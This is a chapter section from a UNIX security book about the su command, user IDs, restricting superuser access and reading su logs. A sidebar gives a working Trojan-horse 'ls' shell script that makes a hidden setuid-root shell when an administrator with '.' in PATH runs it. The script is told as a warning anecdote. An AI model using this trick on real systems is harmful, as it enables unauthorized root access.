<HTML><HEAD><TITLE>[Chapter 4] 4.3 su: Changing Who You Claim to Be</TITLE><METANAME="DC.title"CONTENT="Practical UNIX &amp; Internet Security"><METANAME="DC.creator"CONTENT="Simson Garfinkel &amp; Gene Spafford"><METANAME="DC.publisher"CONTENT="O'Reilly &amp; Associates, Inc."><METANAME="DC.date"CONTENT="1999-02-04T00:01:16Z"><METANAME="DC.type"CONTENT="Text.Monograph"><METANAME="DC.format"CONTENT="text/html"SCHEME="MIME"><METANAME="DC.source"CONTENT="1-56592-148-8"SCHEME="ISBN"><METANAME="DC.language"CONTENT="en-US"><METANAME="generator"CONTENT="Jade 1.1/O'Reilly DocBook 3.0 to HTML 4.0"><LINKREV="made"HREF="mailto:online-books@oreilly.com"TITLE="Online Books Comments"><LINKREL="up"HREF="ch04_01.htm"TITLE="4. Users, Groups, and the Superuser"><LINKREL="prev"HREF="ch04_02.htm"TITLE="4.2 Special Usernames"><LINKREL="next"HREF="ch04_04.htm"TITLE="4.4 Summary"></HEAD><BODYBGCOLOR="#FFFFFF"TEXT="#000000"><DIVCLASS="htmlnav"><H1><IMGSRC="gifs/smbanner.gif"ALT="Practical UNIX &amp; Internet Security"USEMAP="#srchmap"BORDER="0"></H1><MAPNAME="srchmap"><AREASHAPE="RECT"COORDS="0,0,466,65"HREF="index.htm"ALT="Practical UNIX &amp; Internet Security"><AREASHAPE="RECT"COORDS="467,0,514,18"HREF="../search/psrch.htm"ALT="Search this book"></MAP><TABLEWIDTH="515"BORDER="0"CELLSPACING="0"CELLPADDING="0"><TR><TDALIGN="LEFT"VALIGN="TOP"WIDTH="172"><ACLASS="SECT1"HREF="ch04_02.htm"TITLE="4.2 Special Usernames"><IMGSRC="../gifs/txtpreva.gif"ALT="Previous: 4.2 Special Usernames"BORDER="0"></A></TD><TDALIGN="CENTER"VALIGN="TOP"WIDTH="171"><B><FONTFACE="ARIEL,HELVETICA,HELV,SANSERIF"SIZE="-1">Chapter 4<BR>Users, Groups, and the Superuser</FONT></B></TD><TDALIGN="RIGHT"VALIGN="TOP"WIDTH="172"><ACLASS="SECT1"HREF="ch04_04.htm"TITLE="4.4 Summary"><IMGSRC="../gifs/txtnexta.gif"ALT="Next: 4.4 Summary"BORDER="0"></A></TD></TR></TABLE>&nbsp;<HRALIGN="LEFT"WIDTH="515"TITLE="footer"></DIV><DIVCLASS="SECT1"><H2CLASS="sect1"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3">4.3 su: Changing Who You Claim to Be</A></H2><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-3346"></A><ACLASS="indexterm"NAME="AUTOID-3348"></A><ACLASS="indexterm"NAME="AUTOID-3351"></A>Sometimes, one user must assume the identityof another. For example, you might sit down at a friend'sterminal and want to access one of your protected files. Ratherthan forcing you to log your friend out and log yourself in, <SPANCLASS="acronym">UNIX</SPAN>gives you a way to change your user <SPANCLASS="acronym">ID</SPAN> temporarily.It is called the <KBDCLASS="command">su</KBD> command, short for &quot;substitute user.&quot;<KBDCLASS="command">su</KBD> requires that you provide the password of the user to whom youare changing.</P><PCLASS="para">For example, to change yourself from<ICLASS="systemitem.username">tim</I> to <ICLASS="systemitem.username">john</I>, you might type:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">% <BCLASS="emphasis.bold">whoami </B>tim  % <BCLASS="emphasis.bold">su john</B> password: <ICLASS="systemitem.password">fuzbaby</I> % <BCLASS="emphasis.bold">whoami </B>john  % </PRE></BLOCKQUOTE><PCLASS="para">You can now access <ICLASS="systemitem.username">john</I>'sfiles. (And you will be unable to access <ICLASS="systemitem.username">tim</I>'sfiles, unless those files are specifically available to the user<ICLASS="systemitem.username">john</I>.)</P><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3.1">4.3.1 Real and Effective UIDs</A></H3><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-3373"></A><ACLASS="indexterm"NAME="AUTOID-3376"></A><ACLASS="indexterm"NAME="AUTOID-3379"></A><ACLASS="indexterm"NAME="AUTOID-3381"></A>Processeson <SPANCLASS="acronym">UNIX</SPAN> systems have at least two identitiesat every moment. Normally, these two identities are the same. Thefirst identity is the <ICLASS="firstterm">real </I>UID. The real<SPANCLASS="acronym">UID</SPAN> is your &quot;real identity&quot;and matches up (usually) with the username you logged in as. Sometimes,you may want to take on the identity of another user to access somefiles or execute some commands. You might do this by logging inas that user, thus obtaining a new command interpreter whose underlyingprocess has a real <SPANCLASS="acronym">UID</SPAN> equal to that user.</P><PCLASS="para">Alternatively, if you only want to execute a few commandsas another user, you can use the <KBDCLASS="command">su</KBD> command, as described above,to create a new process. This will run a new copy of your commandinterpreter (shell), and have the identity (real <SPANCLASS="acronym">UID</SPAN>)of that other user. To use the <KBDCLASS="command">su</KBD> command, you must either knowthe password for the other user's account, or you mustcurrently be running as the superuser.</P><PCLASS="para">There are timeswhen a software author wants a single command to execute with therights and privileges of another user&nbsp;- most often, the <ICLASS="systemitem.username">root</I> user. In a case such asthis, we certainly don't want to disclose the passwordto the <ICLASS="systemitem.username">root</I> account, nor do we want the user to have access to acommand interpreter running as <ICLASS="systemitem.username">root</I>.<SPANCLASS="acronym">UNIX</SPAN> addresses this problem through the use ofa special kind of file designation called <ACLASS="indexterm"NAME="AUTOID-3396"></A><ACLASS="indexterm"NAME="AUTOID-3398"></A>setuid or <SPANCLASS="acronym">SUID</SPAN>. When a <SPANCLASS="acronym">SUID</SPAN>file is run, the process involved takes on an <EMCLASS="emphasis">effectiveUID </EM>that is the same as the owner of the file, but the<EMCLASS="emphasis">real</EM> <SPANCLASS="acronym">UID</SPAN> remains the same.<SPANCLASS="acronym">SUID</SPAN> files are explained in the following chapter.</P></DIV><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3.2">4.3.2 Saved IDs</A></H3><PCLASS="para">Some versions of <SPANCLASS="acronym">UNIX</SPAN>have a third form of <SPANCLASS="acronym">UID</SPAN>: the <ICLASS="firstterm"><ACLASS="indexterm"NAME="AUTOID-3412"></A>saved UID</I>. In these systems, a user mayrun a setuid program that sets an effective <SPANCLASS="acronym">UID</SPAN>of 0 and then sets some different real <SPANCLASS="acronym">UID</SPAN> aswell. The saved <SPANCLASS="acronym">UID</SPAN> is used by the system toallow the user to set identity back to the original value. Normally,this is not something the user can see, but it can be importantwhen you are writing or running setuid programs.</P></DIV><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3.3">4.3.3 Other IDs</A></H3><PCLASS="para"><SPANCLASS="acronym">UNIX</SPAN> alsohas the analogous concepts of <ICLASS="firstterm"><ACLASS="indexterm"NAME="AUTOID-3422"></A>effectiveGID</I>, <ICLASS="firstterm">real GID</I>, and <ICLASS="firstterm">setgidfor groups. </I></P><PCLASS="para">Some versions of <SPANCLASS="acronym">UNIX</SPAN>also have <ICLASS="firstterm"><ACLASS="indexterm"NAME="AUTOID-3429"></A><ACLASS="indexterm"NAME="AUTOID-3432"></A><ACLASS="indexterm"NAME="AUTOID-3435"></A>session IDs,</I> <ICLASS="firstterm">process groupIDs</I>, and <ICLASS="firstterm">audit IDs</I>. A sessionID is associated with the processes connected to a terminal, andcan be thought of as indicating a &quot;login session.&quot;A process group ID designates a group of processes that are in the<ICLASS="firstterm">foreground</I> or <ICLASS="firstterm">background </I>onsystems that allow job control. An audit ID indicates a thread ofactivity to be indicated as the same in the audit mechanism. Wewill not describe any of these further in this book because youdon't really need to know how they work. However, now youknow what they are if you encounter their names.</P></DIV><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3.4">4.3.4 Becoming the Superuser</A></H3><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-3444"></A><ACLASS="indexterm"NAME="AUTOID-3447"></A>Typing <KBDCLASS="command">su</KBD> withouta username tells <SPANCLASS="acronym">UNIX</SPAN> that you wish to becomethe superuser. You will be prompted for a password. Typing the correct<ICLASS="systemitem.username">root</I> password causesa shell to be run with a <SPANCLASS="acronym">UID</SPAN> of 0. When you becomethe superuser, your prompt should change to the pound sign (#)to remind you of your new powers. For example:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">% <BCLASS="emphasis.bold">/bin/su - </B>password: <ICLASS="systemitem.password">k697dgf</I># <BCLASS="emphasis.bold">whoami </B>root  #</PRE></BLOCKQUOTE><PCLASS="para">When using the <KBDCLASS="command">su</KBD> command to become the superuser, you shouldalways type the command's full pathname, <ICLASS="filename">/bin/su</I>.By typing the full pathname, you are assuring that you are actuallyrunning the real <ICLASS="filename">/bin/su</I> command, and not anothercommand named <ICLASS="filename">su</I> that happens to be in yoursearch path. This method is a very important way of protecting yourself(and the superuser password) from capture by a Trojan horse. Othertechniques are described in <ACLASS="xref"HREF="ch11_01.htm"TITLE="Protecting Against Programmed Threats">Chapter 11</A>. Alsosee the sidebar in the section <ACLASS="xref"HREF="ch04_03.htm#PUIS-CHP-4-SB-1"TITLE="Stealing Superuser">the sidebar "Stealing Superuser"</A>later in this chapter.</P><PCLASS="para">Notice the use of the dash shownin the earlier example. Most versions of the <KBDCLASS="command">su</KBD> command supportan optional argument of a single dash. When supplied, this causes<KBDCLASS="command">su</KBD> to invoke its sub-shell with a dash, which causes the shell toread all relevant startup files and simulate a login. Using thedash option is important when becoming a superuser: the option assuresthat you will be using the superuser's path, and not thepath of the account from which you <KBDCLASS="command">su</KBD>'ed.</P><PCLASS="para">Toexit the subshell, type exit or press control-D.</P><PCLASS="para">Ifyou use the <KBDCLASS="command">su</KBD> command to change to another user while you are thesu-peruser, you won't be prompted for the password of theuser who you are changing yourself into. (This makes sense; as you'rethe superuser, you could as easily change that user's passwordand then log in as that user.) For example:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen"># <BCLASS="emphasis.bold">su john </B>% <BCLASS="emphasis.bold">whoami </B>john  % </PRE></BLOCKQUOTE><PCLASS="para">Once you have becomethe superuser, you are free to perform whatever system administrationyou wish.</P><PCLASS="para">Using <KBDCLASS="command">su</KBD> to become the superuser is not asecurity hole. Any user who knows the superuser password could alsolog in as superuser; breaking in through <KBDCLASS="command">su</KBD> is no easier. In fact,<KBDCLASS="command">su</KBD> enhances security: many <SPANCLASS="acronym">UNIX</SPAN> systems can beset up so that every <KBDCLASS="command">su</KBD> attempt is logged, with the date, time,and user who typed the command. Examining these log files allowsthe system administrator to see who is exercising superuser privileges&nbsp;- aswell as who shouldn't be!</P></DIV><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3.5">4.3.5 Using <KBDCLASS="command">su</KBD> with Caution</A></H3><PCLASS="para">If you are thesystem administrator, you should be careful about how you use the<KBDCLASS="command">su</KBD> command. Remember, if you <KBDCLASS="command">su</KBD> to the superuser account, you cando things by accident that you would normally be protected fromdoing. You could also accidentally give away access to the superuseraccount without knowing you did so.</P><PCLASS="para">As an example ofthe first case, consider the real instance of someone we know whothought that he was in a temporary directory in his own accountand typed rm -rf *. Unfortunately, he was actually in the<ICLASS="filename">/usr/lib </I>directory, and he was operating asthe superuser. He spent the next few hours restoring tapes, checkingpermissions, and trying to soothe irate users. The moral of thissmall vignette, and hundreds more we could relate with similar consequences,is that you should not be issuing commands as the superuser unlessyou need the extra privileges. Program construction, testing, andpersonal &quot;housecleaning&quot; should all be done underyour own user identity.</P><PCLASS="para">Another example is when youaccidentally execute a <ACLASS="indexterm"NAME="AUTOID-3491"></A><ACLASS="indexterm"NAME="AUTOID-3493"></A>TrojanHorse program instead of the system command you thought you executed.(See the sidebar later in this chapter.) If something like thishappens to you as user <ICLASS="systemitem.username">root</I>, full access to your system can be givenaway. We discuss some defenses to this in <ACLASS="xref"HREF="ch11_01.htm"TITLE="Protecting Against Programmed Threats">Chapter 11</A>,but one major suggestion is worth repeating: if you need accessto someone else's files, <KBDCLASS="command">su</KBD> to that user ID and make theaccesses as that user rather than as the superuser.</P><PCLASS="para">Forinstance, if a user reports a problem with files in her account,you could <KBDCLASS="command">su</KBD> to the <ICLASS="systemitem.username">root</I>account and investigate, because you might not be able to accessher account or files from your own, regular account. However, abetter approach is to <KBDCLASS="command">su</KBD> to the superuser account, and then <KBDCLASS="command">su</KBD> tothe user's account&nbsp;- you won't need herpassword for the <KBDCLASS="command">su</KBD> after you are <ICLASS="systemitem.username">root</I>.Not only does this method protect the <ICLASS="systemitem.username">root</I> account, but you willalso have some of the same access permissions as the user you arehelping, and that would help you find the problem sooner.</P><DIVCLASS="sidebar"><H4CLASS="sidebar"><ACLASS="title"NAME="PUIS-CHP-4-SB-1">Stealing Superuser</A></H4><PCLASS="para">Once upon a time, many years ago, one of us needed accessto the <ICLASS="systemitem.username">root</I> accounton an academic machine. Although we had been authorized by managementto have <ICLASS="systemitem.username">root </I>access,the local system manager didn't want to disclose the password.He asserted that access to the <ICLASS="systemitem.username">root</I> account was dangerous (correct),that he had far more knowledge of<SPANCLASS="acronym"> UNIX </SPAN>than wedid (unlikely), and that we didn't need the access (incorrect).After several diplomatic and bureaucratic attempts to get accessnormally, we took a slightly different approach, with management'swry approval.</P><PCLASS="para">We noticed that this user had &quot;.&quot;at the beginning of his shell search path. This meant that everytime he typed a command name, the shell would first search the currentdirectory for the command of the same name. When he did a <KBDCLASS="command">su</KBD> to<ICLASS="systemitem.username">root</I>, this search pathwas inherited by the new shell. This was all we really needed.</P><PCLASS="para">First, we created an executable shell file named ls in thecurrent directory:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">#!/bin/shcp /bin/sh ./stuff/junk/.superdudechmod 4555 ./stuff/junk/.superduderm -f $0exec /bin/ls ${1+&quot;$@&quot;}</PRE></BLOCKQUOTE><PCLASS="para">Then,we executed the following commands:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">% <BCLASS="emphasis.bold">cd </B>% <BCLASS="emphasis.bold">chmod 700 .</B>% <BCLASS="emphasis.bold">touch ./-f</B></PRE></BLOCKQUOTE><PCLASS="para">The trap was ready. Weapproached the recalcitrant administrator with the complaint, &quot;Ihave a funny file in my directory I can't seem to delete.&quot;Because the directory was mode 700, he couldn't list thedirectory to see the contents. So, he used <KBDCLASS="command">su</KBD> to become user <ICLASS="systemitem.username">root</I>. Then he changed the directoryto our home directory and issued the command ls to view the problemfile. Instead of the system version of ls, he ran our version. Thiscreated a hidden setuid <ICLASS="systemitem.username">root</I>copy of the shell, deleted the bogus ls command, and ran the realls command. The administrator never knew what happened.</P><PCLASS="para">Welistened politely as he explained (superciliously) that files beginningwith a dash character (-) needed to be deleted with a pathnamerelative to the current directory (in our case, <ICLASS="filename">rm ./-f</I>);of course, we knew that.</P><PCLASS="para">A few minutes later, he couldn'tget the new <ICLASS="systemitem.username">root</I> password.</P></DIV></DIV><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3.6">4.3.6 Restricting <KBDCLASS="command">su</KBD></A></H3><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-3536"></A><ACLASS="indexterm"NAME="AUTOID-3538"></A>On some versions of Berkeley-derived<SPANCLASS="acronym">UNIX</SPAN>, a user cannot <KBDCLASS="command">su</KBD> to the <ICLASS="systemitem.username">root</I> account unless the useris a member of the process group <ICLASS="systemitem.username"><ACLASS="indexterm"NAME="AUTOID-3545"></A>wheel</I>&nbsp;- or any other groupgiven the group ID of 0. For this restriction to work, the <ICLASS="filename">/etc/group</I>entry for group <ICLASS="systemitem.username">wheel</I>must be non-empty; if the entry has no usernames listed, the restrictionis disabled, and anyone can <KBDCLASS="command">su</KBD> to user <ICLASS="systemitem.username">root</I>if they have the password.</P><PCLASS="para">Some versions of <KBDCLASS="command">su</KBD> alsoallow members of the <ICLASS="systemitem.username">wheel</I>group to become the superuser by providing their own passwords insteadof the superuser password. The advantage of this feature is thatyou don't need to tell the superuser's passwordto a user for them to have superuser access&nbsp;- you simplyhave to put them into the <ICLASS="systemitem.username">wheel</I>group. You can take away their access simply by taking them outof the group.</P><PCLASS="para">Some versions of <ACLASS="indexterm"NAME="AUTOID-3556"></A>System V <SPANCLASS="acronym">UNIX</SPAN>require that users specifically be given permission to <KBDCLASS="command">su</KBD>. Differentversions of <SPANCLASS="acronym">UNIX</SPAN> accomplish this in differentways; consult your own system's documentation for details,and use the mechanism if it is available.</P><PCLASS="para">Another wayto restrict the <KBDCLASS="command">su</KBD> program is by making it executable only by aspecific group and by placing in that group only the people whoyou want to be able to run the command. For information on how todo this, see &quot;Changing a File's Permissions&quot;in <ACLASS="xref"HREF="ch05_01.htm"TITLE="The UNIX Filesystem">Chapter 5</A>.</P></DIV><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3.7">4.3.7 The Bad <KBDCLASS="command">su</KBD> Log</A></H3><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-3569"></A><ACLASS="indexterm"NAME="AUTOID-3572"></A><ACLASS="indexterm"NAME="AUTOID-3575"></A><ACLASS="indexterm"NAME="AUTOID-3578"></A><ACLASS="indexterm"NAME="AUTOID-3581"></A>Mostversions of the <KBDCLASS="command">su</KBD> command log failed attempts. Older versions of<SPANCLASS="acronym">UNIX</SPAN> explicitly logged bad <KBDCLASS="command">su</KBD> attempts to theconsole and in the <ICLASS="filename">/var/adm/messages</I> file.[11] Newer versions logbad <KBDCLASS="command">su</KBD> attempts through the <ACLASS="indexterm"NAME="AUTOID-3591"></A>syslogfacility, allowing you to send the messages to a file of your choiceor to log facilities on remote computers across the network. (SomeSystem V versions log to the file <ICLASS="filename"><ACLASS="indexterm"NAME="AUTOID-3594"></A><ACLASS="indexterm"NAME="AUTOID-3597"></A>/var/adm/sulog</I>in addition to syslog, or instead of it.)</P><BLOCKQUOTECLASS="footnote"><PCLASS="para">[11] Many UNIX log files that are currently stored in the /var/admdirectory have been stored in the /usr/adm directoryin previous versions of UNIX.</P></BLOCKQUOTE><PCLASS="para">If you noticemany bad attempts, it may well be an indication that somebody usingan account on your system is trying to gain unauthorized privileges:this might be a legitimate user poking around, or it might be anindication that the user's account has been appropriatedby an outsider who is trying to gain further access.</P><PCLASS="para">Asingle bad attempt, of course, might simply be a mistyped password,someone mistyping the du command, or somebody wondering what the<KBDCLASS="command">su</KBD> command does.[12]</P><BLOCKQUOTECLASS="footnote"><PCLASS="para">[12] Which of course leads us to observethat people who try commands to see what they do shouldn'tbe allowed to run commands like <KBDCLASS="command">su</KBD> once they find out.</P></BLOCKQUOTE><PCLASS="para">You can quickly scan the <ICLASS="filename">/var/adm/messages</I>file for bad passwords with the grep command:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">% <BCLASS="emphasis.bold">grep BAD /var/adm/messages</B>BADSU 09/12 18:40 - pts/0 rachel-root</PRE></BLOCKQUOTE><PCLASS="para">Good <KBDCLASS="command">su</KBD> attempts look like this:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">% <BCLASS="emphasis.bold">grep + /var/adm/sulog</B>SU 09/14 23:42 + pts/2 simsong-rootSU 09/16 08:40 + pts/4 simsong-rootSU 09/16 10:34 + pts/3 simsong-root</PRE></BLOCKQUOTE><PCLASS="para">It would appear that Simson has been busy <KBDCLASS="command">su</KBD>'ingto <ICLASS="systemitem.username">root</I> on September 14th and 16th.</P><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3.7.1">4.3.7.1 The sulog under Berkeley UNIX</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-3619"></A>The <ICLASS="filename">/var/adm/messages</I>log has a different format on computers running Berkeley <SPANCLASS="acronym">UNIX</SPAN>:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">% grep su:Sep 11 01:40:59 bogus.com su: ericx to root on /dev/ttyu0Sep 12 18:40:02 bogus.com su: BAD su rachel on /dev/ttyp1</PRE></BLOCKQUOTE><PCLASS="para">In this example, user <ICLASS="systemitem.username">rachel</I>tried to <KBDCLASS="command">su</KBD> on September 12th and failed. This is something we wouldinvestigate further to see if it really was Rachel.</P></DIV></DIV><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-4-SECT-3.8">4.3.8 Other Uses of <KBDCLASS="command">su</KBD></A></H3><PCLASS="para">On older versions of<SPANCLASS="acronym">UNIX</SPAN>, the <KBDCLASS="command">su</KBD> command was frequently used in the<ICLASS="filename">crontab</I> file to cause programs executed bycron to be run under different user IDs. A line from a <ICLASS="filename">crontab</I>file to run the UUCP uuclean program (which trims the log filesin the uucp directory) might have had the form:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">0 4 * * * su uucp -c /usr/lib/uucp/uuclean</PRE></BLOCKQUOTE><PCLASS="para">This use of <KBDCLASS="command">su</KBD> is now largely obsolete: the few systems thatstill use a single <ICLASS="filename">crontab</I> file for all usersnow allow the username to be specified as the sixth argument oneach line of the <ICLASS="filename">crontab</I> file:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">0 4 * * * uucp /usr/lib/uucp/uuclean</PRE></BLOCKQUOTE><PCLASS="para">Most versions of <SPANCLASS="acronym">UNIX</SPAN> now use a versionof the cron system that can have a separate <ICLASS="filename">crontab</I>file for each user, and there is no need to specify the usernameto use. Each file is given the username of the user for whom itis to be run; that is, cron commands to be run as <ICLASS="systemitem.username">root</I> are placed in a file called<ICLASS="systemitem.username">root</I>, while cron commandsto be run as <ICLASS="systemitem.username">uucp</I> areplaced in a file called <ICLASS="systemitem.username">uucp</I>.These files are often kept in the directory <ICLASS="filename">/usr/spool/cron/crontabs</I>.</P><PCLASS="para">Nevertheless, you can still use the <KBDCLASS="command">su</KBD> command forrunning commands under different user names. You might want to dothis in some shell scripts. However, check your documentation asto the proper method of specifying options to be passed to the commandvia the <KBDCLASS="command">su</KBD> command line.<ACLASS="indexterm"NAME="AUTOID-3653"></A><ACLASS="indexterm"NAME="AUTOID-3655"></A><ACLASS="indexterm"NAME="AUTOID-3658"></A></P></DIV></DIV><DIVCLASS="htmlnav"><P></P><HRALIGN="LEFT"WIDTH="515"TITLE="footer"><TABLEWIDTH="515"BORDER="0"CELLSPACING="0"CELLPADDING="0"><TR><TDALIGN="LEFT"VALIGN="TOP"WIDTH="172"><ACLASS="SECT1"HREF="ch04_02.htm"TITLE="4.2 Special Usernames"><IMGSRC="../gifs/txtpreva.gif"ALT="Previous: 4.2 Special Usernames"BORDER="0"></A></TD><TDALIGN="CENTER"VALIGN="TOP"WIDTH="171"><ACLASS="book"HREF="index.htm"TITLE="Practical UNIX &amp; Internet Security"><IMGSRC="../gifs/txthome.gif"ALT="Practical UNIX &amp; Internet Security"BORDER="0"></A></TD><TDALIGN="RIGHT"VALIGN="TOP"WIDTH="172"><ACLASS="SECT1"HREF="ch04_04.htm"TITLE="4.4 Summary"><IMGSRC="../gifs/txtnexta.gif"ALT="Next: 4.4 Summary"BORDER="0"></A></TD></TR><TR><TDALIGN="LEFT"VALIGN="TOP"WIDTH="172">4.2 Special Usernames</TD><TDALIGN="CENTER"VALIGN="TOP"WIDTH="171"><ACLASS="index"HREF="index/idx_0.htm"TITLE="Book Index"><IMGSRC="../gifs/index.gif"ALT="Book Index"BORDER="0"></A></TD><TDALIGN="RIGHT"VALIGN="TOP"WIDTH="172">4.4 Summary</TD></TR></TABLE><HRALIGN="LEFT"WIDTH="515"TITLE="footer"><PCLASS="nav"><FONTSIZE="-1">[ <AHREF="../index.htm"TITLE="The Networking CD Bookshelf">Library Home</A> | <AHREF="../dnsbind/index.htm"TITLE="DNS &amp; BIND">DNS &amp; BIND</A> | <AHREF="../tcpip/index.htm"TITLE="TCP/IP Network Administration">TCP/IP</A> | <AHREF="../sendmail/index.htm"TITLE="sendmail">sendmail</A> | <AHREF="../smdref/index.htm"TITLE="sendmail Desktop Reference">sendmail Reference</A> | <AHREF="../firewall/index.htm"TITLE="Building Internet Firewalls">Firewalls</A> | <AHREF="index.htm"TITLE="Practical UNIX &amp; Internet Security">Practical Security</A> ]</FONT></P></DIV></BODY></HTML>